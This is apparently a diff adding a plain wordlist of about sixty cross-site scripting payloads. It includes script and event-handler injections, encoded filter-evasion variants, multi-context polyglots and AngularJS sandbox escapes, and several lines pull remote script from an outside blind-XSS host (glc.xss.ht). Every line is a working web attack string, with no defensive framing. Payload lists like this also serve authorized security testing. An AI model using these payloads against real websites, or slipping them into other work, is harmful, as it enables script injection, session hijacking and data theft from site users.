@@ -1,0 +1,62 @@
+confirm(1)
+confirm(1);//
+,x:confirm(1),
+'"><script>confirm(1)</script>
+'"><scr<script>ipt>confirm(1)</scr<script>ipt>
+'"><script>confirm(1)</script>
+'"><img src=x onerror=confirm(1);>
+'"><img src=x onerror=confirm(1)//
+'"><img src=x:confirm(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=confirm(1);>
+'"><svg%20onload%3Dconfirm(1)>
+'"><svgonload=confirm(1)>
+'"><svg/onload=confirm(1)>
+'"><svg onload=confirm(1)//
+"><svg/onload=confirm(1)>
+;URL=javascript:confirm(1);
+#"><img src=/ onerror=confirm(1)>
+<!--*/!'*/!>%0D<svg/onload=confirm`1`//
+-(confirm)(1)//
+; confirm(1);//
+'-confirm(1)-'
+javascript:confirm(1)
+java%09script:con%09firm(1) 
+java%0dscript:confirm(1)
+\j\av\a\s\cr\i\pt\:\c\o\nfirm\(1\)
+javascript://%0Aconfirm(1)
+%19Jav%09asc%09ript:https://example.com.br/%250Acon%09firm%25281%2529
+<sVg/oNloAd="JaVaScRiPt:/**\/*\'/"\eval(atob('Y29uZmlybSgxKTs='))">
+data:text/html,<script>confirm(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+
+document.writeln("a".link("javas\cript:al"%2b"ert`1`")); :))
+<script src="data:;base64,YWxlcnQoMSk="></script>
+[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`1\x29`))();//
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">confirm(1)</something:script>
+<svg xmlns="http://www.w3.org/2000/svg" onload="confirm(1)"/>
+<\/style><svg/onload=confirm(1)>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm(1 )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=confirm(1)//>\x3e
+</script><svg/onload=%0D%0A'+/"/+/onfocus=1/+(prompt(5))//'%0D%0Aautofocus>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:confirm(1) type=submit>'-->" ></script><script>confirm(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+" onclick=confirm(1)//<button ‘ onclick=confirm(1)//> */ confirm(1)//
+';confirm(1)//';confirm(1)//";confirm(1)//";confirm(1)//-- ></SCRIPT>">'><SCRIPT>confirm(1) </SCRIPT>
+javascript://'/</title></style></textarea></script>--><p" onclick=confirm(1)//>*/confirm()/*
+javascript://</title></style></textarea>--></script><a"//' onclick=confirm(1)//>*/confirm()/*
+javascript://'//" --></textarea></style></script></title><b onclick= confirm(1)//>*/confirm()/*
+javascript://</title></textarea></style></script --><li '//" '*/confirm(1)/*', onclick=confirm(1)//
+javascript:confirm()//--></script></textarea></style></title><a"//' onclick=confirm(1)//>*/confirm(1)/*
+--></script></title></style>"/</textarea><a' onclick=confirm(1)//>*/confirm(1)/*
+/</title/'/</style/</script/</textarea/--><p" onclick=confirm(1)//>*/confirm(1)/*
+javascript://--></title></style></textarea></script><svg "//' onclick=confirm(1)//
+/</title/'/</style/</script/--><p" onclick=confirm(1)//>*/confirm(1)/*
+'"><script src=glc.xss.ht>
+'"><SCriPT a=">" SRC="https://glc.xss.ht"></SCripT>
+'"><ScrIPT a=`>` SRC='https://glc.xss.ht'></SCRipT>
+?"></script><base%20c%3D=href%3Dhttps:\glc.xss.ht>
+{{constructor.constructor('prompt(1)')()}}
+{{0[a='constructor'][a]('prompt(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=prompt(1)');}}
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,prompt(1),a')}}
+{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",prompt(prompt=1),"')}}
+{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","prompt(1)"].sort(c)}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'prompt(1)')()}}
+{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",prompt(prompt=1),"')}}
